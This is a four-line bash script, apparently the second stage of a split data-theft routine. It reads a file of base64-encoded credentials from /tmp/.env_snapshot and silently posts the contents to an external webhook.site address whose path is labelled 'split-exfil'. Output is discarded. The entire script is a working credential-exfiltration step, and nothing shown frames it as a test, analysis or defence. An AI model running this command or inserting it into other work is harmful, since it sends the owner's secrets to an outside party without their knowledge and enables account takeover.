#!/bin/bash
# Step 2: "upload" — ships the base64-encoded credentials to a webhook.
DATA=$(cat /tmp/.env_snapshot)
curl -s -X POST -d "$DATA" https://webhook.site/3f8a-split-exfil >/dev/null
